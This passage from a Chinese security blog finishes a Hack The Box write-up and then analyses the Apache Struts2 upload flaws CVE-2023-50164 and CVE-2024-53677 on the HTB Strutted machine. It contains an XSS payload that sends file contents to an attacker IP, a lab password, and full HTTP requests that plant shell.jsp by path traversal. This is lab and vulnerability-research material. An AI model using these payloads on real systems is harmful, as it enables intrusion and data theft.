class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;a href=<span class="hljs-string">&quot;javascript:(function()&#123;var req1 = new XMLHttpRequest();req1.open(&#x27;GET&#x27;, &#x27;http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php&#x27;, true);req1.onload = function() &#123;var text = req1.responseText;fetch(&#x27;http://10.10.14.25:8000?base64=&#x27; + btoa(text));&#125;;req1.send();&#125;)();&quot;</span>&gt;<span class="hljs-variable constant_">XSS</span> test&lt;/a&gt;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719220343898.png" alt="image-20250719220343898"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$valid_username</span> = <span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-variable">$valid_password</span> = <span class="hljs-string">&#x27;IKw75eR0MR7CMIxhH0&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_USER&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_PW&#x27;</span>]) || <br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_USER&#x27;</span>] != <span class="hljs-variable">$valid_username</span> || <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_PW&#x27;</span>] != <span class="hljs-variable">$valid_password</span>) &#123;<br>    <br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;WWW-Authenticate: Basic realm=&quot;Employee Management&quot;&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: dashboard.php&#x27;</span>);<br><span class="hljs-keyword">exit</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>有个密码 <code>IKw75eR0MR7CMIxhH0</code></p><p>这个应该是jobert的密码，登陆试一下</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719220734916.png" alt="image-20250719220734916"></p><p>他是admin用户，我们也尝试了root，直接拿到root权限了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719220831149.png" alt="image-20250719220831149"></p><p>这台靶机就被我们拿下了</p><p><span style="font-size:1.9em;">happy hacking ~</span></p>]]></content>
    
    
    <categories>
      
      <category>HTB靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB靶机</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Strutted 靶机与 CVE-2024-53677</title>
    <link href="/2025/07/06/HTB-Strutted-%E9%9D%B6%E6%9C%BA%E4%B8%8E-CVE-2024-53677/"/>
    <url>/2025/07/06/HTB-Strutted-%E9%9D%B6%E6%9C%BA%E4%B8%8E-CVE-2024-53677/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="HTB-Strutted-靶机与-CVE-2024-53677"><a href="#HTB-Strutted-靶机与-CVE-2024-53677" class="headerlink" title="HTB Strutted 靶机与 CVE-2024-53677"></a>HTB Strutted 靶机与 CVE-2024-53677</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打 htb 靶机 <a href="https://app.hackthebox.com/machines/Strutted">strutted</a> 的时候看到了他的源码，使用了 <code>struts2 6.3.0.1</code> 的框架，在网上搜所相关文章学习了一下这个漏洞，写篇文章记录一下漏洞原理和打靶过程。</p><p>源码 我就直接使用的 htb 机器上提供的漏洞源码, 懒得开机器的话，可以用网盘下载<br>链接：<a href="https://pan.quark.cn/s/12e03dd04c92?pwd">https://pan.quark.cn/s/12e03dd04c92?pwd</a> &#x3D; 7dr3<br>提取码：7dr3</p><h3 id="CVE-2023-50164"><a href="#CVE-2023-50164" class="headerlink" title="CVE-2023-50164"></a>CVE-2023-50164</h3><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>Struts 2.0.0-2.3.37<br>Strust 2.5.0-2.5.32<br>Strust 6.0.0-6.3.0</p><h3 id="CVE-2024-53677"><a href="#CVE-2024-53677" class="headerlink" title="CVE-2024-53677"></a>CVE-2024-53677</h3><h4 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h4><p>Struts 2.0.0 - Struts 2.3.37（EOL）</p><p> Struts 2.5.0 - Struts 2.5.33 </p><p>Struts 6.0.0 - Struts 6.3.0.2</p><h2 id="项目部署"><a href="#项目部署" class="headerlink" title="项目部署"></a>项目部署</h2><p>直接在 idea 上配置 tmocat 就可以了，用 jdk17，项目的 pom 文件里也有</p><p>可以把上传的路径改一下，因为 <code>System.getProperty(&quot;user.dir&quot;)</code> 默认在 tomcat 的 bin 目录下。当然不改也没关系</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250629111245258.png" alt="image-20250629111245258"></p><p>改了之后，我们就可以在 <code>tmocat/webapps/ROOT/</code> 目录下看到初始化的数据库文件和上传的图片了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250629111631525.png" alt="image-20250629111631525"></p><blockquote><p>不改的话，就在 tomcat&#x2F;bin&#x2F;webapps&#x2F;ROOT&#x2F; 目录下</p></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在 struts2 文件上传过程中会经过 FileUploadInterceptor<span style="color:#FF0000;">（将<code>multipart/form-data</code>请求流中的文件部分先解析保存为临时文件） </span>和 ParametersInterceptor<span style="color:#FF0000;">（将所有表单参数赋值到Action属性上，做类型转换、绑定）</span> 这两个拦截器，在 <code>struts-default.xml</code> 配置文件中也有体现</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250629125415579.png" alt="image-20250629125415579" style="zoom: 50%;" /><p>我们简单上传一个文件看看具体流程</p><h3 id="FileUploadInterceptor"><a href="#FileUploadInterceptor" class="headerlink" title="FileUploadInterceptor"></a>FileUploadInterceptor</h3><p>首先来到 FileUploadInterceptor 的 <strong>intercept</strong> 方法，获得上下文，再从上下文中拿到本次 request 请求</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250629182943838.png" alt="image-20250629182943838"></p><p>从 MultiPartRequestWrapper 中拿到文件上传请求的各种参数</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250629184413948.png" alt="image-20250629184413948"></p><p>在获取文件名的过程中，也对文件名称做了一些处理，比如防止目录穿越，我们可以跟进一下这个 <code>getFileNames()</code> 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250629191811243.png" alt="image-20250629191811243"></p><p>来到 JakartaMultiPartRequest#getFileNames</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250629192119557.png" alt="image-20250629192119557" style="zoom:67%;" /><p>来到 AbstractMultiPartRequest#getCanonicalName 这个方法处理文件名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> String <span class="hljs-title function_">getCanonicalName</span><span class="hljs-params">(String originalFileName)</span> &#123;<br>    <span class="hljs-comment">// 获取最后一个正斜杠 &#x27;/&#x27; ASCII为47 的索引，适用于 *nix 路径 如 /tmp/evil.jsp</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">forwardSlash</span> <span class="hljs-operator">=</span> originalFileName.lastIndexOf(<span class="hljs-number">47</span>);<br>    <span class="hljs-comment">// 获取最后一个反斜杠 &#x27;\&#x27; ASCII为92 的索引，适用于 Windows 路径 如 C:\windows\evil.jsp</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">backwardSlash</span> <span class="hljs-operator">=</span> originalFileName.lastIndexOf(<span class="hljs-number">92</span>);<br>    String fileName;<br>    <span class="hljs-keyword">if</span> (forwardSlash != -<span class="hljs-number">1</span> &amp;&amp; forwardSlash &gt; backwardSlash) &#123;<br>        <span class="hljs-comment">// 若路径中即有&#x27;/&#x27;且其位置晚于&#x27;\&#x27;，则以&#x27;/&#x27;为分割，截取最后一部分</span><br>        fileName = originalFileName.substring(forwardSlash + <span class="hljs-number">1</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 其他情况，如仅有&#x27;\&#x27;或二者均无（无目录，或Windows风格路径最末），以&#x27;\&#x27;为分割</span><br>        fileName = originalFileName.substring(backwardSlash + <span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> fileName;<br>&#125;<br></code></pre></td></tr></table></figure><p><span style="font-size:1.3em;">按照<code>\/</code> 斜线做了截取，所以就有效防止了 <code>../../</code> 形式的目录穿越</span></p><p>我们接着来看 FileUploadInterceptor#intercept 方法</p><p>在拿到文件名后，获取文件内容并封装，再添加到上下文中</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250629194532841.png" alt="image-20250629194532841"></p><h3 id="ParametersInterceptor"><a href="#ParametersInterceptor" class="headerlink" title="ParametersInterceptor"></a>ParametersInterceptor</h3><p>接下来就是 ParametersInterceptor#intercept 给 uploadAction 做参数绑定，其实这个函数也是老生常谈的了，在 struts2 的很多 CVE 中都有出现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">doIntercept</span><span class="hljs-params">(ActionInvocation invocation)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">action</span> <span class="hljs-operator">=</span> invocation.getAction();<br>        <span class="hljs-keyword">if</span> (!(action <span class="hljs-keyword">instanceof</span> NoParameters)) &#123;<br>            <span class="hljs-type">ActionContext</span> <span class="hljs-variable">ac</span> <span class="hljs-operator">=</span> invocation.getInvocationContext();<br>            <span class="hljs-type">HttpParameters</span> <span class="hljs-variable">parameters</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.retrieveParameters(ac);<br>            <span class="hljs-keyword">if</span> (LOG.isDebugEnabled()) &#123;<br>                LOG.debug(<span class="hljs-string">&quot;Setting params &#123;&#125;&quot;</span>, <span class="hljs-built_in">this</span>.getParameterLogMap(parameters));<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (parameters != <span class="hljs-literal">null</span>) &#123;<br>                Map&lt;String, Object&gt; contextMap = ac.getContextMap();<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    ReflectionContextState.setCreatingNullObjects(contextMap, <span class="hljs-literal">true</span>);<br>                    ReflectionContextState.setDenyMethodExecution(contextMap, <span class="hljs-literal">true</span>);<br>                    ReflectionContextState.setReportingConversionErrors(contextMap, <span class="hljs-literal">true</span>);<br>                    <span class="hljs-type">ValueStack</span> <span class="hljs-variable">stack</span> <span class="hljs-operator">=</span> ac.getValueStack();<br>                    <span class="hljs-built_in">this</span>.setParameters(action, stack, parameters);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    ReflectionContextState.setCreatingNullObjects(contextMap, <span class="hljs-literal">false</span>);<br>                    ReflectionContextState.setDenyMethodExecution(contextMap, <span class="hljs-literal">false</span>);<br>                    ReflectionContextState.setReportingConversionErrors(contextMap, <span class="hljs-literal">false</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> invocation.invoke();<br>    &#125;<br></code></pre></td></tr></table></figure><p>拿到 HttpParameters</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250629210220731.png" alt="image-20250629210220731"></p><p>调用 setParameters 绑定，在这个方法中使用的是 TreeMap() </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250629210947881.png" alt="image-20250629210947881"></p><blockquote><p>TreeMap 相交于 HashMap 有一个特性，我们都知道 HashMap 的键值顺序是随机的，但是 TreeMap 会按照 key 整体的 unicode 码值大小进行排序，<code>一般表现为大写在前，小写在后（但不是绝对的，更加严谨的还是要算unicode码值）</code></p></blockquote><p>后边就是从创建的 TreeMap 中取值利用 setParameter()方法把参数放入到值栈上去，并绑定到 UploadAction 中。了解值栈可以参考 <a href="https://developer.aliyun.com/article/330800">Struts2 的值栈和对象栈-阿里云开发者社区</a> </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250629212520708.png" alt="image-20250629212520708"></p><p>这个 setParameter 也导致过很多的 ognl 表达式注入，<strong>当然对于后续的绕过，正是利用了它可以执行 ognl 表达式的特性</strong>。<span style="color:#FF0000;">ParametersInterceptor 还会获取到其他的参数，放入值栈中，并绑定到对应的 Action 对象上。而在FileUploadInterceptor的处理过程中，我们也看到 fileName是存在硬编码的</span></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">contentTypeName</span> <span class="hljs-operator">=</span> inputName + <span class="hljs-string">&quot;ContentType&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">fileNameName</span> <span class="hljs-operator">=</span> inputName + <span class="hljs-string">&quot;FileName&quot;</span>;<br></code></pre></td></tr></table></figure><blockquote><p><code>inputeName</code> 是上传文件的输入框名称 值为 upload，所以 fileNameName 变量就是 <code>uploadFileName</code></p></blockquote><p>在 setParameter &#x3D;&#x3D;&gt; Action 的 setter 方法过程中，参数会在 ognl.OgnlRuntime#getDeclaredMethods 中被 capitalizeBeanPropertyName 处理成 baseName，进行了首字母大写。<span style="font-size:1.4em;"><strong>这样我们不就可以把小写的 uploadFileName 变成大写的 UploadFileName，对应的 Action 的 setter 方法也就是 setUploadFile 了，可以变量覆盖</strong></span></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250705104210251.png" alt="image-20250705104210251"></p><p>这部分的调用站栈</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">getDeclaredMethods:</span><span class="hljs-number">2653</span>, OgnlRuntime (ognl)<br><span class="hljs-symbol">_getSetMethod:</span><span class="hljs-number">2915</span>, OgnlRuntime (ognl)<br><span class="hljs-symbol">getSetMethod:</span><span class="hljs-number">2884</span>, OgnlRuntime (ognl)<br><span class="hljs-symbol">hasSetMethod:</span><span class="hljs-number">2955</span>, OgnlRuntime (ognl)<br><span class="hljs-symbol">hasSetProperty:</span><span class="hljs-number">2973</span>, OgnlRuntime (ognl)<br><span class="hljs-symbol">setProperty:</span><span class="hljs-number">83</span>, CompoundRootAccessor (<span class="hljs-keyword">com</span>.opensymphony.xwork2.ognl.accessor)<br><span class="hljs-symbol">setProperty:</span><span class="hljs-number">3359</span>, OgnlRuntime (ognl)<br><span class="hljs-symbol">setValueBody:</span><span class="hljs-number">134</span>, ASTProperty (ognl)<br><span class="hljs-symbol">evaluateSetValueBody:</span><span class="hljs-number">220</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">308</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">829</span>, Ognl (ognl)<br><span class="hljs-symbol">lambda$setValue$2:</span><span class="hljs-number">550</span>, OgnlUtil (<span class="hljs-keyword">com</span>.opensymphony.xwork2.ognl)<br><span class="hljs-symbol">execute:</span><span class="hljs-number">-1</span>, OgnlUtil$$Lambda<span class="hljs-number">$232</span>/<span class="hljs-number">0x0000000800ee89a8</span> (<span class="hljs-keyword">com</span>.opensymphony.xwork2.ognl)<br><span class="hljs-symbol">compileAndExecute:</span><span class="hljs-number">625</span>, OgnlUtil (<span class="hljs-keyword">com</span>.opensymphony.xwork2.ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">543</span>, OgnlUtil (<span class="hljs-keyword">com</span>.opensymphony.xwork2.ognl)<br><span class="hljs-symbol">trySetValue:</span><span class="hljs-number">195</span>, OgnlValueStack (<span class="hljs-keyword">com</span>.opensymphony.xwork2.ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">182</span>, OgnlValueStack (<span class="hljs-keyword">com</span>.opensymphony.xwork2.ognl)<br><span class="hljs-symbol">setParameter:</span><span class="hljs-number">166</span>, OgnlValueStack (<span class="hljs-keyword">com</span>.opensymphony.xwork2.ognl)<br><span class="hljs-symbol">setParameters:</span><span class="hljs-number">228</span>, ParametersInterceptor (<span class="hljs-keyword">com</span>.opensymphony.xwork2.interceptor)<br></code></pre></td></tr></table></figure><h3 id="UploadAction"><a href="#UploadAction" class="headerlink" title="UploadAction"></a>UploadAction</h3><p>后边就是 Action 的执行了，UploadAction 即是 Action 又是 Entity。而在 Entity 的实例化过程中，必然是通过 setter 方法来给属性赋值，action 会从值栈上拿到对应映射的值。</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250705111310724.png" alt="image-20250705111310724"></p><h2 id="漏洞成因-CVE-2023-50164"><a href="#漏洞成因-CVE-2023-50164" class="headerlink" title="漏洞成因(CVE-2023-50164)"></a>漏洞成因(CVE-2023-50164)</h2><p>所以讲了这么多，我们可以在 ParametersInterceptor 拦截参数的时候多输入一个 <code>uploadFileName</code> 的参数，让他进入值栈的时候，设置到原本的 uploadFileName 下边，这样会调用两遍 setUploadFileName() 方法，从而实现文件名在 setParamter() 方法处理过程中绕过文件名的限制。</p><p>那么新的问题来了，我们怎样才能使自己的 uploadFileName 在原本的下边呢？</p><p>其实这也很简单，主要利用到了 TreeMap 的特性，我们把程序本身的 inputName 改为大写的 <code>Upload</code> ，在 FileUploadInterceptor 做硬编码拼接的时候就是 <code>UploadFileName</code> 了，这样在就可以实现这种操作</p><p>这样就有了两种格式的 POC</p><h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h3><ol><li>在路径后边添加 uploadFileName 参数</li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/strutted/upload.action?uploadFileName=../shell.jsp</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>190<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;-Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;102&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:8080<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarynPQvNY6ZvKUvK7vg<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:8080/strutted/upload.action<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=2BF12D4C6451AFAE9FB0C4509738F8BE<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarynPQvNY6ZvKUvK7vg</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;Upload&quot;; filename=&quot;1.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: application/octet-stream</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;% <span class="hljs-keyword">out</span>.println(&quot;EXP&quot;);%&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarynPQvNY6ZvKUvK7vg--</span></span><br></code></pre></td></tr></table></figure><h3 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h3><ol start="2"><li>在 POST 请求体中添加参数</li></ol><blockquote><p>在 HTTP multipart&#x2F;form-data 中，上传内容可含多段：</p><ul><li>文件内容字段：通常有 <code>Content-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;1.txt&quot;</code> 和实际文件内容。</li><li>普通参数字段：如 <code>Content-Disposition: form-data; name=&quot;uploadFileName&quot;</code>，内容为 <strong>某个文本</strong>。</li></ul></blockquote><p>我们可以在加入一个文本字段</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/strutted/upload.action?=../shell.jsp</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>190<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;-Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;102&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:8080<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarynPQvNY6ZvKUvK7vg<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:8080/strutted/upload.action<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=2BF12D4C6451AFAE9FB0C4509738F8BE<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarynPQvNY6ZvKUvK7vg</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;Upload&quot;; filename=&quot;1.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: application/octet-stream</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;% <span class="hljs-keyword">out</span>.println(&quot;EXP&quot;);%&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarynPQvNY6ZvKUvK7vg</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;uploadFileName&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: application/octet-stream</span><br><span class="language-pgsql">../shell.jsp</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarynPQvNY6ZvKUvK7vg--</span></span><br></code></pre></td></tr></table></figure><h2 id="绕过-CVE-2024-53677"><a href="#绕过-CVE-2024-53677" class="headerlink" title="绕过(CVE-2024-53677)"></a>绕过(CVE-2024-53677)</h2><p>经过上述的学习，我们对 CVE-2023-50164 漏洞已经基本了解了，但是官方在后续版本中进行了修复 <a href="https://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163">github diff</a></p><p>在 HttpParameters 的 appenAll()方法，增加了 remove 逻辑</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250706183140818.png" alt="image-20250706183140818"></p><p>把 paramName 变成小写，判断是否存在，存在就删除。这样就修复们利用参数来传输同名变量，实现恶意文件名覆盖原变量的恶意操作。</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250706183251494.png" alt="image-20250706183251494"></p><p>但是这样依然是可以绕过的，因为在 ParametersInterceptor#setParameters 是通过 ognl 表达式操作值栈，来实现 Action 参数绑定的，<span style="font-size:1.4em; color:#FF0000;">所以我们通过ognl表达式来绕过他对大小写检验的修复</span></p><p>取到值栈中的 uploadFileName 变量，改变它的值。</p><p>通过 <code>[0]</code> 就可以取到整个值栈</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250706190307393.png" alt="image-20250706190307393" style="zoom:50%;" /><p>通过 <code>[0].top.uploadFileName</code> 就可以取到，在 setParameter() 放入值栈后，我们就可以通过 ognl 表达式拿到对应的值</p><img 